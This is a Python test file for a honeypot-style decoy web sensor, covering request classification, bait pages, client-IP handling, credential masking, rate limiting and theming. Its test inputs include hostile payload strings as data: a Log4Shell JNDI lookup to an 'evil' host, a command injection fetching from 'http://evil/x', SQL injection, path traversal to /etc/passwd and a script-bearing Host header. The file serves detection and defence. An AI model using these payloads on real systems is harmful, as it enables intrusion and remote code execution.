#!/usr/bin/env python3
"""Tests for the decoy sensor's pure logic. Run: python3 sensors/test_decoy_sensor.py"""

import os
import sys

sys.path.insert(0, os.path.dirname(__file__))

from decoy_sensor import (  # noqa: E402
    BAIT_DIR,
    BAIT_PAGES,
    DEFAULT_THEME_DIR,
    LOGIN_PATHS,
    _State,
    classify,
    client_ip,
    content_type_for,
    http_fingerprint,
    is_login_attempt,
    fill_bait,
    fill_origin,
    load_theme,
    mask_form,
    mask_value,
    parse_form,
    resolve_route,
)

COMMON = {"password", "123456", "admin"}
THEME = load_theme(DEFAULT_THEME_DIR)


# --- classify -------------------------------------------------------------

def test_a_normal_browser_request_is_benign():
    ua = "Mozilla/5.0 (X11; Linux x86_64) Firefox/142.0"
    assert classify("GET", "/products", "", "", ua) == "benign"


def test_a_scanner_user_agent_is_flagged():
    assert classify("GET", "/", "", "", "Mozilla/5.00 (Nikto/2.5.0)") == "scanner_ua"
    assert classify("GET", "/", "", "", "curl/8.5.0") == "scanner_ua"


def test_probing_sensitive_paths_is_dirbust():
    assert classify("GET", "/.env", "", "", "x") == "dirbust"
    assert classify("GET", "/wp-content/debug.log", "", "", "x") == "dirbust"


def test_posting_to_a_fake_login_is_login():
    assert classify("POST", "/wp-login.php", "", "log=admin&pwd=admin", "x") == "login"


def test_sql_injection_markers_win_over_dirbust():
    sig = classify("GET", "/products", "id=1 union select password from users", "", "x")
    assert sig == "sqli"


def test_path_traversal_is_detected():
    assert classify("GET", "/static", "file=../../../../etc/passwd", "", "x") == "traversal"


def test_log4shell_is_cve_probe_and_outranks_everything():
    # jndi in the UA-ish header space; even with a scanner UA it stays cve_probe.
    sig = classify("GET", "/", "x=${jndi:ldap://evil/a}", "", "sqlmap/1.7")
    assert sig == "cve_probe"


def test_command_injection_is_rce():
    assert classify("GET", "/cgi", "x=1;wget http://evil/x", "", "x") == "rce"


def test_url_encoded_payloads_are_decoded_before_matching():
    # A real scanner sends curl's UA with an encoded payload; the severe
    # signature must still win over scanner_ua.
    assert classify("GET", "/x", "id=1%20union%20select%20p", "", "curl/8") == "sqli"
    assert classify("GET", "/a", "x=%24%7Bjndi%3Aldap%3A%2F%2Fe%2Fa%7D", "", "curl/8") == "cve_probe"


def test_androxgh0st_is_a_cve_probe():
    # The botnet POSTs 0x[]=androxgh0st to / hunting Laravel debug mode.
    assert classify("POST", "/", "", "0x%5B%5D=androxgh0st", "") == "cve_probe"


def test_every_credential_post_is_a_login_attempt_whatever_its_signature():
    assert is_login_attempt("POST", "/phpmyadmin/index.php")
    assert is_login_attempt("POST", "/administrator/index.php")
    assert not is_login_attempt("GET", "/wp-login.php")
    assert not is_login_attempt("POST", "/contact")
    # A payload in the username still classifies as the attack...
    assert classify("POST", "/wp-login.php", "", "log=admin'+or+1=1--&pwd=x", "") == "sqli"
    # ...while is_login_attempt keeps it on the Credentials page.


def test_a_visitors_message_on_a_site_form_is_never_an_exploit():
    # A no-JS visitor submitting /contact: quotes, dashes and a backtick in
    # free text must not read as sqli/rce (exploits are banned).
    body = "name=Pat&message=I+said+%27hi%27+--+and+used+a+%60backtick%60+%24%28lol%29"
    assert classify("POST", "/contact", "", body, "Mozilla/5.0 Firefox/142.0", THEME.pages) == "benign"


def test_every_fake_login_form_posts_to_a_served_login_path():
    import re
    site = str(BAIT_DIR)
    forms = 0
    for name in sorted(os.listdir(site)):
        if not name.endswith(".html"):
            continue
        html = open(os.path.join(site, name), encoding="utf-8").read()
        if 'type="password"' not in html or name == "browser-check.html":
            continue
        for action in re.findall(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html, re.IGNORECASE):
            forms += 1
            assert action in LOGIN_PATHS, f"{name} posts to {action}, not a login path"
            assert resolve_route(action, THEME)[2] == "bait", f"{name} posts to {action}, which 404s"
    assert forms >= 3


# --- themes ---------------------------------------------------------------

def test_the_default_theme_is_complete():
    assert THEME.name == "Bawls Inc."
    assert THEME.pages["/"] == "index.html" and "/investors" in THEME.flaky
    for filename in [*THEME.pages.values(), THEME.not_found, THEME.unavailable]:
        assert (THEME.root / filename).is_file(), filename
    # Every bait file exists, and none of it lives in the theme.
    for filename, _ in BAIT_PAGES.values():
        assert (BAIT_DIR / filename).is_file(), filename
        assert not (THEME.root / filename).exists(), f"bait {filename} leaked into the theme"


def _write_theme(root, pages, files):
    import json
    root.mkdir(parents=True)
    for name in files:
        (root / name).write_text("<h1>x</h1>")
    (root / "theme.json").write_text(json.dumps({"name": "T", "pages": pages, "not_found": "404.html", "unavailable": "503.html"}))


def test_a_broken_theme_is_rejected():
    import tempfile
    from pathlib import Path
    with tempfile.TemporaryDirectory() as tmp:
        tmp = Path(tmp)
        _write_theme(tmp / "ok", {"/": "index.html"}, ["index.html", "404.html", "503.html"])
        assert load_theme(tmp / "ok").pages == {"/": "index.html"}
        for name, pages, files in (
            ("missing", {"/": "index.html"}, ["404.html", "503.html"]),                     # page file absent
            ("escape", {"/": "../ok/index.html"}, ["404.html", "503.html"]),                # path leaves the theme
            ("bait", {"/wp-login.php": "index.html"}, ["index.html", "404.html", "503.html"]),  # shadows bait
        ):
            _write_theme(tmp / name, pages, files)
            try:
                load_theme(tmp / name)
            except ValueError:
                continue
            raise AssertionError(f"{name} theme was accepted")


# --- resolve_route --------------------------------------------------------

def test_known_pages_map_to_site_files():
    assert resolve_route("/", THEME) == (200, "index.html", "page")
    assert resolve_route("/products", THEME) == (200, "products.html", "page")


def test_bait_paths_serve_plausible_pages():
    assert resolve_route("/wp-login.php", THEME) == (200, "wp-login.html", "bait")
    assert resolve_route("/.env", THEME) == (200, "dotenv.txt", "bait")


def test_new_bait_and_known_paths_resolve():
    assert resolve_route("/.git/HEAD", THEME)[2] == "bait"
    assert resolve_route("/actuator/env", THEME) == (200, "actuator-env.json", "bait")
    assert resolve_route("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", THEME)[2] == "bait"
    assert resolve_route("/sitemap.xml", THEME) == (200, "sitemap.xml", "page")
    assert resolve_route("/favicon.ico", THEME) == (200, "favicon.svg", "page")
    # built-out corporate pages (clean URLs)
    assert resolve_route("/pricing", THEME) == (200, "pricing.html", "page")
    assert resolve_route("/products/ball-pro", THEME) == (200, "product-ball-pro.html", "page")
    assert resolve_route("/press/series-b", THEME) == (200, "news-series-b.html", "page")


def test_content_type_by_extension():
    assert "json" in content_type_for("x.json")
    assert content_type_for("favicon.svg") == "image/svg+xml"
    assert content_type_for("sitemap.xml").startswith("application/xml")
    assert content_type_for("index.html").startswith("text/html")
    assert content_type_for("assets/site.css").startswith("text/css")
    assert content_type_for("assets/site.js").startswith("text/javascript")


def test_unknown_paths_get_the_branded_404():
    assert resolve_route("/this-does-not-exist", THEME) == (404, "404.html", "error")


# --- client_ip ------------------------------------------------------------

def test_the_socket_peer_is_used_when_not_behind_the_proxy():
    # A direct client (peer is not the trusted proxy) — XFF is ignored.
    assert client_ip("203.0.113.9", "1.2.3.4", "127.0.0.1") == "203.0.113.9"


def test_a_forged_forwarded_header_cannot_spoof_the_source():
    # Behind the proxy (peer 127.0.0.1): the proxy appends the true client last,
    # so a client-forged left-hand value does not win.
    xff = "9.9.9.9, 203.0.113.50"  # "9.9.9.9" is the forged part
    assert client_ip("127.0.0.1", xff, "127.0.0.1") == "203.0.113.50"


def test_forwarded_header_is_used_only_from_the_trusted_proxy():
    assert client_ip("127.0.0.1", "198.51.100.7", "127.0.0.1") == "198.51.100.7"


# --- masking --------------------------------------------------------------

def test_a_common_password_is_kept_as_dictionary_data():
    assert mask_value("pwd", "password", COMMON) == "password"


def test_an_uncommon_secret_is_masked_to_its_length():
    assert mask_value("pwd", "Tr0ub4dour&3xtra", COMMON) == "[masked:16 chars]"


def test_non_secret_fields_pass_through():
    assert mask_value("username", "bob", COMMON) == "bob"


def test_mask_form_applies_per_field():
    form = {"log": "admin", "pwd": "hunter2longsecret", "api_key": "123456"}
    masked = mask_form(form, COMMON)
    assert masked["log"] == "admin"
    assert masked["pwd"] == "[masked:17 chars]"
    assert masked["api_key"] == "123456"  # on the common list, kept


def test_http_fingerprint_is_stable_for_the_same_shape():
    a = http_fingerprint("GET", "HTTP/1.1", ["Host", "User-Agent", "Accept"], "*/*", "gzip", "en")
    b = http_fingerprint("GET", "HTTP/1.1", ["Host", "User-Agent", "Accept"], "*/*", "gzip", "en")
    assert a == b and len(a) == 16


def test_http_fingerprint_changes_with_header_order():
    # Same headers, different order — a real tell between a browser and a tool.
    browserish = http_fingerprint("GET", "HTTP/1.1", ["Host", "User-Agent", "Accept", "Accept-Language", "Accept-Encoding"], "text/html", "gzip, br", "en-US")
    toolish = http_fingerprint("GET", "HTTP/1.1", ["User-Agent", "Host", "Accept"], "*/*", "", "")
    assert browserish != toolish


def test_parse_form_reads_urlencoded_and_ignores_other_bodies():
    assert parse_form(b"log=admin&pwd=x", "application/x-www-form-urlencoded") == {"log": "admin", "pwd": "x"}
    assert parse_form(b"{\"a\":1}", "application/json") == {}


def test_flood_cap_suppresses_overflow_and_summarizes_once():
    os.environ["DECOY_MAX_PER_MIN"] = "3"
    try:
        st = _State()
        ip = "203.0.113.200"
        assert [st.should_ship(ip) for _ in range(5)] == [True, True, True, False, False]
        summary = st.drain_suppressed()
        assert len(summary) == 1
        assert summary[0]["src_ip"] == ip
        assert summary[0]["raw"]["suppressed"] == 2
        assert summary[0]["raw"]["signature"] == "flood"
        assert st.drain_suppressed() == []  # draining resets the counter
    finally:
        del os.environ["DECOY_MAX_PER_MIN"]


def test_drain_sweeps_stale_rate_entries_and_summarizes():
    import time
    st = _State()
    now_bucket = int(time.time() // 60)
    st.rate = {
        "9.9.9.9": {"bucket": now_bucket - 5, "count": 300, "suppressed": 7},  # stale, overflowed
        "1.1.1.1": {"bucket": now_bucket, "count": 2, "suppressed": 0},         # current minute
    }
    events = st.drain_suppressed()
    # the stale flooder still produces a summary, then is swept from the map
    assert any(e["src_ip"] == "9.9.9.9" and e["raw"]["suppressed"] == 7 for e in events)
    assert "9.9.9.9" not in st.rate
    assert "1.1.1.1" in st.rate


def _run():
    tests = [(name, obj) for name, obj in sorted(globals().items())
             if name.startswith("test_") and callable(obj)]
    passed = 0
    for name, fn in tests:
        try:
            fn()
            print(f"  ok  {name}")
            passed += 1
        except AssertionError as error:
            print(f"  FAIL {name}: {error}")
        except Exception as error:  # noqa: BLE001
            print(f"  ERROR {name}: {error!r}")
    print(f"\n{passed}/{len(tests)} passed")
    return 0 if passed == len(tests) else 1


if __name__ == "__main__":
    sys.exit(_run())


def test_robots_and_sitemap_name_the_host_that_was_asked_for():
    sitemap = (DEFAULT_THEME_DIR / "sitemap.xml").read_bytes()
    filled = fill_origin(sitemap, "decoy.example", "203.0.113.5")
    assert b"<loc>https://decoy.example/products</loc>" in filled
    assert b"{{origin}}" not in filled
    robots = fill_origin((DEFAULT_THEME_DIR / "robots.txt").read_bytes(), "decoy.example:8443", "203.0.113.5")
    assert b"Sitemap: https://decoy.example:8443/sitemap.xml" in robots


def test_a_hostile_host_header_is_not_reflected():
    for host in ['evil.example"><script>', "a b", "", "x" * 300, "host/path"]:
        assert fill_origin(b"{{origin}}/", host, "203.0.113.5") == b"https://203.0.113.5/"
    assert fill_origin(b"{{origin}}/", "", "2001:db8::5") == b"https://[2001:db8::5]/"


def test_files_without_the_placeholder_are_untouched():
    assert fill_origin(b"<h1>Bawls</h1>", "decoy.example", "203.0.113.5") == b"<h1>Bawls</h1>"


def test_the_default_themes_robots_and_sitemap_name_no_domain_of_their_own():
    import re

    robots = (DEFAULT_THEME_DIR / "robots.txt").read_text()
    assert "Sitemap: {{origin}}/sitemap.xml" in robots
    locations = re.findall(r"<loc>([^<]*)</loc>", (DEFAULT_THEME_DIR / "sitemap.xml").read_text())
    assert locations and all(loc.startswith("{{origin}}/") for loc in locations)


def test_secret_shaped_bait_is_assembled_only_when_served():
    import json
    import re

    on_disk = (BAIT_DIR / "config-json.json").read_bytes()
    assert b"_live_" not in on_disk
    served = json.loads(fill_bait(on_disk))
    assert re.fullmatch(r"sk_live_[0-9A-Za-z]{24,}", served["secret_key"])
    for path in BAIT_DIR.iterdir():
        assert b"{{" not in fill_bait(path.read_bytes()), path.name

